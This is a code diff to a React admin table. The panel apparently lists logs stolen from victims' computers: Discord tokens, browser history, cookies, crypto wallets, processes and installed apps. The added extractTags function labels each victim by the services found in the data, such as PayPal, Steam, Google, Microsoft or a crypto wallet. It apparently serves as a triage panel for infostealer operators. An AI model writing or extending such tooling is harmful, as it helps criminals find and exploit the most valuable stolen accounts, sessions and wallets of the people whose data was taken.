@@ -17,6 +17,7 @@ import {
     Typography,
     CircularProgress,
     Checkbox,
+    Chip,
 } from '@mui/material';
 import { visuallyHidden } from '@mui/utils';
 
@@ -25,8 +26,100 @@ const headCells = [
     { id: 'country', numeric: false, disablePadding: false, label: 'Country' },
     { id: 'date', numeric: false, disablePadding: false, label: 'Date' },
     { id: 'dataSummary', numeric: false, disablePadding: false, label: 'Data Summary' },
+    { id: 'tags', numeric: false, disablePadding: false, label: 'Tags' },
     { id: 'actions', numeric: false, disablePadding: false, label: 'Actions' },
 ];
+
+// Function to extract tags from log data
+const extractTags = (log) => {
+    const tags = [];
+    const pcData = log.pcData || {};
+    
+    // Check for Discord tokens
+    if (pcData.discordTokens && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0) {
+        tags.push({ label: 'Discord (token)', color: '#5865F2' });
+    }
+    
+    // Check browser history and cookies for sites
+    const allUrls = [];
+    
+    // Extract URLs from browser history
+    if (pcData.browserHistory) {
+        const history = pcData.browserHistory;
+        ['chromeHistory', 'firefoxHistory', 'edgeHistory', 'operaHistory', 'braveHistory'].forEach(browser => {
+            if (history[browser] && Array.isArray(history[browser])) {
+                history[browser].forEach(entry => {
+                    if (entry.url) allUrls.push(entry.url.toLowerCase());
+                });
+            }
+        });
+    }
+    
+    // Extract domains from cookies
+    if (pcData.browserCookies) {
+        let cookies = [];
+        if (typeof pcData.browserCookies === 'string') {
+            try {
+                cookies = JSON.parse(pcData.browserCookies);
+            } catch (e) {
+                // If parsing fails, try to extract domains from string
+                const domainMatches = pcData.browserCookies.match(/"domain"\s*:\s*"([^"]+)"/gi);
+                if (domainMatches) {
+                    domainMatches.forEach(match => {
+                        const domain = match.match(/"([^"]+)"/)[1];
+                        if (domain) allUrls.push(domain.toLowerCase());
+                    });
+                }
+            }
+        } else if (Array.isArray(pcData.browserCookies)) {
+            cookies = pcData.browserCookies;
+        }
+        
+        if (Array.isArray(cookies)) {
+            cookies.forEach(cookie => {
+                if (cookie.domain) allUrls.push(cookie.domain.toLowerCase());
+            });
+        }
+    }
+    
+    // Site detection patterns
+    const sitePatterns = {
+        'YouTube': ['youtube.com', 'youtu.be', 'youtube-nocookie.com'],
+        'Microsoft': ['microsoft.com', 'office.com', 'outlook.com', 'live.com', 'hotmail.com', 'onedrive.com', 'azure.com', 'microsoftonline.com'],
+        'Google': ['google.com', 'gmail.com', 'googlemail.com', 'googletagmanager.com', 'googleapis.com', 'googleusercontent.com'],
+        'Facebook': ['facebook.com', 'fb.com', 'messenger.com'],
+        'Twitter': ['twitter.com', 'x.com', 't.co'],
+        'Instagram': ['instagram.com'],
+        'TikTok': ['tiktok.com'],
+        'Reddit': ['reddit.com'],
+        'Amazon': ['amazon.com', 'amazon.co.uk', 'amazon.de', 'amazon.fr'],
+        'Steam': ['steamcommunity.com', 'steampowered.com', 'steam-chat.com'],
+        'Epic Games': ['epicgames.com', 'unrealengine.com'],
+        'PayPal': ['paypal.com'],
+        'GitHub': ['github.com'],
+        'Netflix': ['netflix.com'],
+        'Spotify': ['spotify.com'],
+        'Discord': ['discord.com', 'discordapp.com', 'discord.gg'],
+    };
+    
+    // Check for each site
+    Object.keys(sitePatterns).forEach(siteName => {
+        const patterns = sitePatterns[siteName];
+        const found = allUrls.some(url => {
+            return patterns.some(pattern => url.includes(pattern));
+        });
+        if (found && !tags.some(t => t.label.includes(siteName))) {
+            tags.push({ label: siteName, color: '#60a5fa' });
+        }
+    });
+    
+    // Check for crypto wallets
+    if (pcData.cryptoWallets && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0) {
+        tags.push({ label: 'Crypto Wallet', color: '#f59e0b' });
+    }
+    
+    return tags;
+};
 
 function LogsTable() {
     const [logs, setLogs] = useState([]);
@@ -328,6 +421,7 @@ function LogsTable() {
                             {sortedLogs.slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage).map((log, index) => {
                                 const isItemSelected = isSelected(log.id);
                                 const labelId = `enhanced-table-checkbox-${index}`;
+                                const tags = extractTags(log);
 
                                 return (
                                     <TableRow
@@ -373,6 +467,33 @@ function LogsTable() {
                                         <TableCell sx={{ color: '#94a3b8' }}>{new Date(log.date).toLocaleString()}</TableCell>
                                         <TableCell sx={{ color: '#94a3b8' }}>
                                             {`H:${log.dataSummary.historyEntries || 0}, P:${log.dataSummary.processes || 0}, A:${log.dataSummary.installedApps || 0}, C:${log.dataSummary.cookies || 0}`}
+                                        </TableCell>
+                                        <TableCell>
+                                            <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 0.5, maxWidth: '300px' }}>
+                                                {tags.length > 0 ? (
+                                                    tags.map((tag, tagIndex) => (
+                                                        <Chip
+                                                            key={tagIndex}
+                                                            label={tag.label}
+                                                            size="small"
+                                                            sx={{
+                                                                backgroundColor: tag.color || '#60a5fa',
+                                                                color: '#ffffff',
+                                                                fontSize: '0.7rem',
+                                                                height: '20px',
+                                                                fontWeight: 500,
+                                                                '& .MuiChip-label': {
+                                                                    padding: '0 6px',
+                                                                }
+                                                            }}
+                                                        />
+                                                    ))
+                                                ) : (
+                                                    <Typography variant="body2" sx={{ color: '#64748b', fontStyle: 'italic' }}>
+                                                        No tags
+                                                    </Typography>
+                                                )}
+                                            </Box>
                                         </TableCell>
                                         <TableCell>
                                             <Button 
